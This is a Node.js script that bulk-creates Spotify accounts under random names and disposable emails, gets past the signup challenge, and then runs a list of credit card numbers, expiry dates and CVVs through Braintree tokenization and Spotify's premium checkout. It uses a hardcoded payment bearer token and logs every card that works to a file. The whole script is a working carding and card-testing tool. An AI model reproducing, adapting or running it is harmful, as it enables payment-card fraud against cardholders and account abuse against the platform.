const readlineSync = require('readline-sync');
var random_name = require('node-random-name');
const fs = require('fs');
const delay = require('delay');
var figlet = require('figlet');
var chalk = require('chalk');

let request = require("request-promise");
const cookieJar = request.jar();
request = request.defaults({ jar: cookieJar });
const axios = require('axios');
let version_ua_phone = [
    "Samsung galaxy 7edge",
    "Samsung galaxy 7",
    "Samsung galaxy 8",
    "Samsung galaxy 8edge",
    "Samsung galaxy 9edge",
    "Samsung galaxy 9",
];
let mail = [
    "@gmail.com",
    "@hotmail.com",
    "@outlook.com",
    "@outlook.co.id",
    "@icloud.com",
    "@yahoo.com"
];

let domainName = [
    "qiott.com",
    "wuuvo.com",
    "kzccv.com"
];

const console = require('console');

function getRandomInt(max) {
    return Math.floor(Math.random() * Math.floor(max));
}

const startTime = new Date();
(async () => {

    console.log(
        chalk.redBright(
            figlet.textSync('SPOTIFY CREATOR', { horizontalLayout: 'fitted' })
        )
    );
    console.log(
        chalk.greenBright(
            figlet.textSync('                                    [O] .=. [O]', { horizontalLayout: 'fitted' }),
        )
    );
    console.log('\n')
    var i = 0;
    var no = 0
    var o = 0
    var max = 0
    function makeid(length) {
        let result = '';
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const charactersLength = characters.length;
        let counter = 0;
        while (counter < 8) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
            counter += 1;
        }
        return result;
    }
    function makeiid(length) {
        let result = '';
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const charactersLength = characters.length;
        let counter = 0;
        while (counter < 4) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
            counter += 1;
        }
        return result;
    }
    sessionID = makeid() + "-" + makeiid() + "-" + makeiid() + "-" + makeiid() + "-" + makeiid()//e9bdc9cb-b523-4057-9a31-4cae0d25a32d
    attempid = makeid() + "-" + makeiid() + "-" + makeiid() + "-" + makeiid() + "-" + makeiid()
    console.log
    var cc1 = readlineSync.question(chalk.whiteBright('[+] Input Text : '));
    let cc2 = cc1 + ".txt"
    const file2 = fs.readFileSync(cc2, 'UTF-8');
    const mntp2 = file2.split(/\r?\n/);
    while (i < mntp2.length) {
        var pay = i + 5;
        no++
        console.log("")
        var nama1 = random_name({
            first: true
        });
        var nama2 = random_name({
            last: true
        });
        var hasil = nama1 + nama2
        var hasil1 = Math.floor(Math.random() * 100) + 21;
        var hasil3 = hasil + hasil1
        let tahun = [
            1990, 1991, 1992, 1993, 1994, 1995, 1996, 1997, 1999, 2000, 2001, 2002, 2003, 2004, 1989, 1988, 1987, 1985, 1986, 1984, 1983, 1982, 1981, 1980
        ]
        var angka1 = Math.floor(Math.random() * 100) + 100
        var angka2 = Math.floor(Math.random() * 100) + 25
        const userAgentList = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/' + angka1 + '.36 (KHTML, like Gecko) Chrome/' + angka2 + '.0.4577.' + angka2 + ' Safari/' + angka1 + '.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/' + angka1 + '.1.' + angka2 + ' (KHTML, like Gecko) Version/14.0.3 Mobile/15E' + angka1 + ' Safari/' + angka1 + '.1',

            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/' + angka1 + '.' + angka2 + ' (KHTML, like Gecko) Chrome/' + angka2 + '.0.4280.' + angka1 + ' Safari/' + angka1 + '.' + angka2 + ' Edg/' + angka2 + '.0.' + angka1 + '.75',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/' + angka1 + '.' + angka2 + ' (KHTML, like Gecko) Chrome/' + angka2 + '.0.3538.' + angka1 + ' Safari/' + angka1 + '.' + angka2 + ' Edge/' + angka2 + '.18363',
        ]
        const apikeylist = [
            //"a2d4b979dc624757b4fb47de483f3505",
            // 'a1e486e2729f46d6bb368d6b2bcda326',
            //"142b583129b2df829de3656f9eb484e6",
            "4c7a36d5260abca4af282779720cf631",
            //"a2d4b979dc624757b4fb47de483f3505"
        ]
        var tgl = Math.floor(Math.random() * 19) + 10
        var bulan = Math.floor(Math.random() * 8) + 1
        const randomthn = tahun[Math.floor(Math.random() * tahun.length)];
        const randomUserAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];
        const randomEmail = mail[Math.floor(Math.random() * mail.length)];
        const randomDevices = version_ua_phone[Math.floor(Math.random() * version_ua_phone.length)];
        var email2 = nama1 + nama2 + hasil1 + randomEmail
        const randomApiKey = apikeylist[Math.floor(Math.random() * apikeylist.length)]
        //======================================================================FUNCTION
        //SIGN UP   
        try {
           
            var infoemail = (nama1 + nama2 + hasil1 + `@${domainName[getRandomInt(domainName.length)]}`).toLowerCase();
            let registemail = await axios({
                method: "get",
                url: "https://www.1secmail.com/?login=" + hasil3 + `&domain=${version_ua_phone[getRandomInt(domainName.length)]}`,
                headers: {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "sec-ch-ua": "\"Google Chrome\";v=\"111\", \"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"111\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1"
                }
            }).then(function (res) {
            })

            console.log(no + ". " + infoemail)
            //console.log(randomApiKey)
            let signup = await axios({
                method: 'post',
                url: 'https://spclient.wg.spotify.com/signup/public/v2/account/create',
                headers: {
                    'authority': 'spclient.wg.spotify.com',
                    'accept': '*/*',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/json',
                    'origin': 'https://www.spotify.com',
                    'referer': 'https://www.spotify.com/',
                    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': randomUserAgent
                },
                data: {
                    account_details: {
                        birthdate: `${randomthn}-0${bulan}-${tgl}`,
                        consent_flags: {
                            eula_agreed: true,
                            send_email: true,
                            third_party_email: false
                        },
                        display_name: nama1,
                        email_and_password_identifier: {
                            email: infoemail,
                            password: "admin123"
                        },
                        gender: 1
                    },
                    callback_uri: "https://www.spotify.com/signup/challenge?locale=id-id",
                    client_info: {
                        api_key: randomApiKey,
                        app_version: "v2",
                        capabilities: [
                            1
                        ],
                        installation_id: "d67f4e27-3957-4e35-b294-20e7c92f951d",
                        platform: "www"
                    },
                    tracking: {
                        creation_flow: "",
                        creation_point: "https://www.spotify.com/id-id/signup",
                        referrer: ""
                    },
                    recaptcha_token: null,
                    submission_id: "d6986eac-715c-495d-a1cd-dad808778546",
                    flow_id: "b3927701-1094-4e44-afe1-0e2b7cde32ee"
                }
            })
                .then(function (response) {
                    res = response.data
                    //console.log(res)
                })

            if (res.hasOwnProperty('challenge')) {
                session_reg = res.challenge.session_id
                // console.log("ses "+session_reg);

                let get_session = await axios({
                    method: 'post',
                    url: 'https://spclient.wg.spotify.com/challenge-orchestrator/v1/get-session',
                    headers: {
                        "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                        "sec-ch-ua-mobile": "?0",
                        "user-agent": randomUserAgent,
                        "content-type": 'application/json',
                        "accept": "*/*",
                        "accept-language": "id"
                    },
                    data: {
                        "session_id": session_reg
                    },
                })
                    .then(function (response) {
                    //    console.log(response.data.in_progress.challenge_details.web_challenge_launcher)
                        challenge_reg = response.data.in_progress.challenge_details.challenge_id
                    })


                let challenge_cmd = await axios({
                    method: 'post',
                    url: "https://challenge.spotify.com/api/v1/invoke-challenge-command",
                    headers: {
                        "accept": "*/*",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type": "application/json",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-ua-platform": "\"Android\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-site"

                    },
                    data: {
                        "session_id": session_reg,
                        "challenge_id": challenge_reg,
                        "dummy_challenge_v1": {
                            "noop": {}
                        }
                    }
                }).then(function (response) {
                  //  console.log(response.data)
                })

                let comp_signup = await axios({
                    method: 'post',
                    url: "https://spclient.wg.spotify.com/signup/public/v2/account/complete-creation",
                    headers: {
                        "accept": "*/*",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type": "application/json",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-ua-platform": "\"Android\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-site"

                    },
                    data: {
                        "session_id": session_reg
                    },
                })
                    .then(function (response) {
                        // console.log(response.data)
                        logintoken = response.data.success.login_token
                        // return logintoken;

                    })
            }
            else {
                logintoken = res.success.login_token
                //console.log("token"+logintoken)

            }
            // INTERFACE
            console.log("   Waiting For Premium Account")
            //GET COOKIE
            const result = await request.get("https://accounts.spotify.com/en/login")
            const getcsrf = cookieJar.getCookieString("https://accounts.spotify.com/en/login")
            //SPLITING sp_sso_csrf_token=
            const csrf = getcsrf.split("sp_sso_csrf_token=")
            const Fixcsrf = csrf[1].split(";")[0]
            // console.log("   " + "Sukses GET X-CSRF-Token= " + Fixcsrf)
            //SPLITING __Host-sp_csrf_sid=
            const csrf_sid = getcsrf.split("__Host-sp_csrf_sid=")
            const Fix_csrf_sid = csrf_sid[1].split(";")[0]
            //  console.log("   " + "Sukses GET Cookie SID= " + Fix_csrf_sid)

            //AUTHLOGIN
            var bodyku = "splot:" + logintoken


            let authlogin = await axios({
                method: 'POST',
                url: 'https://www.spotify.com/api/signup/authenticate',
                headers: {
                    "x-csrf-token": Fixcsrf,
                    "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": randomUserAgent,
                    "content-type": "application/json",
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "accept-encoding": "gzip, deflate, br",
                    "cookie": '__Host-sp_csrf_sid=' + Fix_csrf_sid
                },
                data: {
                    "splot": logintoken
                },

            })
                .then(function (response) {
                    cookie_sp_dc = response.headers['set-cookie']
                    cookie_csrf = response.headers['x-csrf-token']
                    return response
                })

            str_cookie_sp_dc = JSON.stringify(cookie_sp_dc)
            // //SPLITING SP_DC=
            const sp_dc_notfix = str_cookie_sp_dc.split("sp_dc")
            const spdc = sp_dc_notfix[1].split(";")[0]
            // console.log("   " + "Sukses GET sp_dc" + spdc)
            // GET ACCESS TOKEN SAMSUNG

            // let activateSamsung = await axios({
            //     url: "https://spclient.wg.spotify.com/premium-destination-hubs/v2/page?locale=id&device_id=9b4ff48cce620e80&partner_id=&referrer_id=&build_model=Samsung-sm-n900a&cache_key=free&show_unsafe_unpublished_content=false&manufacturer=Samsung",
            //     method: "get",
            //     headers: {
            //         "accept-language": 'id-ID;q=1, en-US;q=0.',
            //         "user-agent": 'Spotify/8.6.4 Android/30 (Samsung-sm-n900a)',
            //         "spotify-app-version": '8.6.4',
            //         "app-platform": 'Android',
            //         "x-client-id": '9a8d2f0ce77a4e248bb71fefcb557637',
            //         "accept-Encoding": 'gzip',
            //         "authorization": 'Bearer ' + bearer
            //     }
            // }).then(function (res) {
            // })

            let getSdk = await axios({
                url: "https://www.spotify.com/api/payment-sdk/v2/data/?paymentProviderIds=billing_cards%2Cbilling_paypal&country=US&isPayment=true&clientName=premium-www-checkout&clientContext=premium-checkout&version=8.0.2&enableStoredPaymentDetails=true&showStoredPaymentDetails=false",
                method: "GET",
                headers: {
                    "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": randomUserAgent,
                    "Braintree-Version": "2018-05-10",
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "accept-encoding": "gzip, deflate, br",
                    "cookie": cookie_sp_dc,
                    "x-csrf-token": cookie_csrf,
                    "referer": "https://www.spotify.com/us/purchase/offer/new-family-1m/?country=ID"
                }
            }).then(function (res) {
                cookie_sp_dc1 = res.headers['set-cookie']
                //   console.log(res.headers)
                cookie_csrf1 = res.headers['x-csrf-token']
                return res
            })
            //SPLITING HOST_SIDx=
            strhostcookie = JSON.stringify(cookie_sp_dc1)
            const strhostcookienotfix = strhostcookie.split("__Host-sp_csrf_sid")
            const host = strhostcookienotfix[1].split(";")[0]

            let upsert = await axios("https://www.spotify.com/api/user-address/v1/upsert", {
                method: "put",
                headers: {
                    "Host": "www.spotify.com",
                    "user-agent": randomUserAgent,
                    "x-csrf-token": cookie_csrf1,
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "text/plain;charset=UTF-8",
                    "locales": "id_ID,id",
                    "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": "\"Android\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "cookie": "sp_dc" + spdc + "; __Host-sp_csrf_sid" + host,
                },
                data: {
                    country: "US",
                    type: "tax",
                    address:
                    {
                        street: "nyc street number 2",
                        city: "New York City",
                        state: "NY",
                        postal_code_short: "10080"
                    }
                },
            }).then(function (res) {
                cookie_csrf2 = res.headers['x-csrf-token']
                cookie_sp_dc2 = res.headers['set-cookie']
                return cookie_csrf2
            })
            strhostcookie1 = JSON.stringify(cookie_sp_dc2)
            const strhostcookienotfix1 = strhostcookie1.split("__Host-sp_csrf_sid")
            const host1 = strhostcookienotfix1[1].split(";")[0]
       //     console.log(host1)
            let beforePay = await axios({
                url: "https://www.spotify.com/api/payment-sdk/v2/create-checkout/?clientName=premium-www-checkout&clientContext=premium-checkout&version=8.0.2",
                method: "post",
                withCredentials: true,
                data: {
                    "country": "US",
                    "offerUuid": "b0d2f7f2-68b6-4719-994c-2029aee3c221",
                    "isChangeDetails": false,
                    "providerId": "cards",
                    "cancelUrl": "https://www.spotify.com/us/purchase/offer/default-duo-master-trial-1m/?country=US",
                    "returnUrl": "https://www.spotify.com/us/purchase/success/?offerUuid=b0d2f7f2-68b6-4719-994c-2029aee3c221&offerId=duo-master-trial-1m&orderReference={checkoutId}"
                },
                headers: {
                    "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": randomUserAgent,
                    "Braintree-Version": "2018-05-10",
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "accept-encoding": "gzip, deflate, br",
                    "cookie": 'sp_dc' + spdc + "; __Host-sp_csrf_sid" + host1,
                    "x-csrf-token": cookie_csrf2,
                }
            }).then(function (res) {
                xcsrf = res.headers['x-csrf-token']
               // console.log(res.data)
                coId = res.data.checkoutId
               // console.log(coId)
                 cookie_sp_dc3 = res.headers['set-cookie']
                return coId
            })
            strhostcookie2 = JSON.stringify(cookie_sp_dc3)
            const strhostcookienotfix2 = strhostcookie2.split("__Host-sp_csrf_sid")
            const host2 = strhostcookienotfix2[1].split(";")[0]
            for (i; i < pay; i++) {
                o++
                var cardnum = mntp2[i].split('|')[0];
                var cardmonth = mntp2[i].split('|')[1];
                var cardyear = mntp2[i].split('|')[2];
                var cardcvv = mntp2[i].split('|')[3];
                if ((cardyear <= 23) && (cardmonth <= 1)) {
                    var cardyear = 23;
                } else if (cardyear < 23) {
                    var cardyear = 23;
                } else if (cardyear >= 2023) {
                    var cardyear = cardyear - 2000;
                }
                else if ((cardnum < 399999999999999 && cardcvv < 999)) {
                    var cardcvv = cardcvv + 2000;
                }
                else if ((cardyear < 2023 && cardyear > 100)) {
                    var cardyear = (cardyear - 2000) + 2;

                }
                else if ((cardnum < 399999999999999 && cardcvv < 999)) {
                    var cardcvv = cardcvv + 2000;

                }
                if ((cardnum < 399999999999999 && cardcvv < 999)) {
                    var cardcvv = cardcvv + 2000;
                }
                binCC = cardnum.slice(0, 6)
                let getCVC = await axios({
                    url: "https://payments.braintree-api.com/graphql",
                    method: "POST",
                    withCredentials: true,
                    credentials: 'include',
                    allowCredentials: true,
                    headers: {
                        "accept": "*/*",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "authorization": "Bearer production_38xgtt8r_k66thkkxtpctwppq",
                        "braintree-version": "2018-05-10",
                        "content-type": "application/json",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "origin": "https://pci.spotify.com",

                    },
                    data: {
                        clientSdkMetadata: {
                            source: "client",
                            integration: "custom",
                            sessionId: sessionID //BELUM FIX SESI
                        },
                        query: "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                        variables: {
                            input: {
                                creditCard: {
                                    cvv: cardcvv
                                },
                                options: {
                                    validate: false
                                }
                            }
                        },
                        operationName: "TokenizeCreditCard"
                    }
                }).then(function (res) {
                    tokenCVC = res.data.data.tokenizeCreditCard.token
                    return tokenCVC

                })


                //     // CVC AUTHORIZATION
                let cvcAuth = await axios({
                    url: "https://payments.braintree-api.com/graphql",
                    method: "POST",
                    headers: {
                        "accept": "*/*",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "authorization": "Bearer production_38xgtt8r_k66thkkxtpctwppq",
                        "braintree-version": "2018-05-10",
                        "content-type": "application/json",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "origin": "https://pci.spotify.com",
                    },
                    data: {
                        clientSdkMetadata: {
                            source: "client",
                            integration: "custom",
                            sessionId: sessionID //BELUM FIX SESI
                        },
                        query: "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                        variables: {
                            input: {
                                creditCard: {
                                    cvv: cardcvv
                                },
                                options: {
                                    validate: false
                                }
                            }
                        },
                        operationName: "TokenizeCreditCard"
                    }
                }).then(function (res) {
                    authVCC = res.data.data.tokenizeCreditCard.token
                    return res
                })
                let card = await axios({
                    url: "https://payments.braintree-api.com/graphql",
                    method: "post",
                    data: {
                        clientSdkMetadata: {
                            source: "client",
                            integration: "custom",
                            sessionId: sessionID
                        },
                        query: "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                        variables: {
                            input: {
                                creditCard: {
                                    number: cardnum,
                                    expirationMonth: cardmonth,
                                    expirationYear: cardyear,
                                    cvv: cardcvv
                                },
                                options: {
                                    validate: false

                                }
                            }
                        },
                        operationName: "TokenizeCreditCard"
                    },
                    headers: {
                        "accept": "*/*",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "authorization": "Bearer production_38xgtt8r_k66thkkxtpctwppq",
                        "braintree-version": "2018-05-10",
                        "content-type": "application/json",
                        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site"
                    }
                }).then(function (res) {
                    authCC = res.data.data.tokenizeCreditCard.token
                    return res
                })
                let payment = await axios("https://www.spotify.com/api/payment-sdk/v2/prepare/?clientName=premium-www-checkout&clientContext=premium-checkout&version=8.0.2", {
                    method: 'post',
                    headers: {
                        "x-csrf-token": xcsrf,
                        "accept": "*/*",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryGB1cBjhVRpaqYOlT",
                        "locales": "en_US,en",
                        "sec-ch-ua": "\"Chromium\";v=\"118\", \"Google Chrome\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "cookie": 'sp_dc' + spdc + "; __Host-sp_csrf_sid" + host2,
                    },
                    data: "------WebKitFormBoundaryGB1cBjhVRpaqYOlT\r\nContent-Disposition: form-data; name=\"checkout.paymentProviderId\"\r\n\r\ncards\r\n------WebKitFormBoundaryGB1cBjhVRpaqYOlT\r\nContent-Disposition: form-data; name=\"checkout.checkoutViewId\"\r\n\r\n97aa4107-50b2-40b5-9a67-c9838d0770e4\r\n------WebKitFormBoundaryGB1cBjhVRpaqYOlT\r\nContent-Disposition: form-data; name=\"checkout.attemptId\"\r\n\r\nb4017ab1-e5fe-4c00-9d74-58bf09f70fdd\r\n------WebKitFormBoundaryGB1cBjhVRpaqYOlT\r\nContent-Disposition: form-data; name=\"checkout.flowId\"\r\n\r\na6850cec-832c-4d75-8230-d70fb5581a99\r\n------WebKitFormBoundaryGB1cBjhVRpaqYOlT\r\nContent-Disposition: form-data; name=\"checkout.checkoutId\"\r\n\r\n"+coId+"\r\n------WebKitFormBoundaryGB1cBjhVRpaqYOlT\r\nContent-Disposition: form-data; name=\"checkout.browserInfo\"\r\n\r\n{\"screenWidth\":1536,\"screenHeight\":864,\"colorDepth\":24,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\",\"timeZoneOffset\":-420,\"language\":\"id-ID\",\"javaEnabled\":false}\r\n------WebKitFormBoundaryGB1cBjhVRpaqYOlT\r\nContent-Disposition: form-data; name=\"checkout.riskDeviceId\"\r\n\r\nrjs-eb667a73-cb5a-4f48-9dfb-32572bf8c2ac\r\n------WebKitFormBoundaryGB1cBjhVRpaqYOlT\r\nContent-Disposition: form-data; name=\"checkout.pci[token]\"\r\n\r\n[{\"cvc\":\""+tokenCVC+"\",\"cvcAuthentication\":\""+authVCC+"\",\"card\":\""+authCC+"\",\"provider\":\"braintree\"}]\r\n------WebKitFormBoundaryGB1cBjhVRpaqYOlT\r\nContent-Disposition: form-data; name=\"checkout.pci[devicefps]\"\r\n\r\n{\"adyen\":\"DpqwU4zEdN0050000000000000pgIOdGFwF00032254872RBDzaiKzBG4DgQHEG0BXBix7RX3az8002SsvLEc2Gfi00000qZkTE00000WrCTEuJmCyD9YhF5n7i9:40\",\"digitalriver\":\"9cf10e8c4f7035d12c37c6e20993038a\"}\r\n------WebKitFormBoundaryGB1cBjhVRpaqYOlT--\r\n",
                }).then(function (res) {
                    console.log(res.data)
                    statusPay = res.status
                    statusPremium = res.data.success
                    status3ds = res.data.action
                    statusData = res.data
                    resultpay = statusData.data.errors[0].message
                    return statusPay, statusPremium
                })
                if (statusPay != 200) {
                    continue;
                } else if (statusPay == 200) {
                    console.log(resultpay)
                    if (statusPremium == false) {
                        console.log(statusData)
                        console.log(chalk.redBright(o + ".  Gagal Premium => " + statusPremium + " " + cardnum + "|" + cardcvv))
                        const removeLines = (data, lines = []) => {
                            return data
                                .split('\n')
                                .filter((val, idx) => lines.indexOf(idx) === -1)
                                .join('\n');
                        }
                        fs.readFile(cc2, 'utf8', (err, data) => {
                            if (err) throw err;
                            fs.writeFile(cc2, removeLines(data, [0]), 'utf8', function (err) {
                                if (err) throw err;
                            });
                        })
                    }
                    else if (status3ds == "iframe_challenge") {
                        console.log(statusData)
                        console.log(chalk.redBright(o + ".  Gagal Premium => " + statusPremium + " " + cardnum + "|" + cardcvv))
                        const removeLines = (data, lines = []) => {
                            return data
                                .split('\n')
                                .filter((val, idx) => lines.indexOf(idx) === -1)
                                .join('\n');
                        }
                        fs.readFile(cc2, 'utf8', (err, data) => {
                            if (err) throw err;
                            fs.writeFile(cc2, removeLines(data, [0]), 'utf8', function (err) {
                                if (err) throw err;
                            });
                        })
                    }

                    else if (status3ds == "iframe_fingerprint") {
                        // console.log(resultpay)
                        console.log(chalk.redBright(o + ".  Gagal Premium => " + statusPremium + " " + cardnum + "|" + cardcvv))
                        const removeLines = (data, lines = []) => {
                            return data
                                .split('\n')
                                .filter((val, idx) => lines.indexOf(idx) === -1)
                                .join('\n');
                        }
                        fs.readFile(cc2, 'utf8', (err, data) => {
                            if (err) throw err;
                            // remove the first line and the 5th and 6th lines in the file
                            fs.writeFile(cc2, removeLines(data, [0]), 'utf8', function (err) {
                                if (err) throw err;
                            });
                        })
                    }
                    else if (statusPremium == true) {
                        max++
                        console.log(statusData)
                        console.log(chalk.greenBright(o + ".  Berhasil Premium => Status Premium : " + statusPremium + " | " + cardnum + "|" + cardmonth + "|" + cardyear + "|" + cardcvv))
                        const removeLines = (data, lines = []) => {
                            return data
                                .split('\n')
                                .filter((val, idx) => lines.indexOf(idx) === -1)
                                .join('\n');
                        }
                        fs.readFile(cc2, 'utf8', (err, data) => {
                            if (err) throw err;

                            // remove the first line and the 5th and 6th lines in the file
                            fs.writeFile(cc2, removeLines(data, [0]), 'utf8', function (err) {
                                if (err) throw err;
                            });
                        })
                        fs.appendFileSync("spotifypremium INDO.txt", infoemail + "\n");
                        fs.appendFileSync("cc spotifypremium INDO.txt", cardnum + "|" + cardmonth + "|" + cardyear + "|" + cardcvv + + "|" + infoemail + "\n");
                        if (max == 2) {
                            process.exit()
                        }
                        break;
                    }
                }
                continue;
            }
            fs.appendFileSync("MEMBER INDO.txt", infoemail + "\n");
            o = 0
    
        if (max == 2) {
            process.exit()
        }
        const endTime = new Date();
        const executionTime = endTime - startTime;
        console.log(`Waktu eksekusi: ${executionTime} ms`);
    } catch (err) {
        o = 0
        console.log(err)
        await delay(1000)
        continue;
    }
    }
})();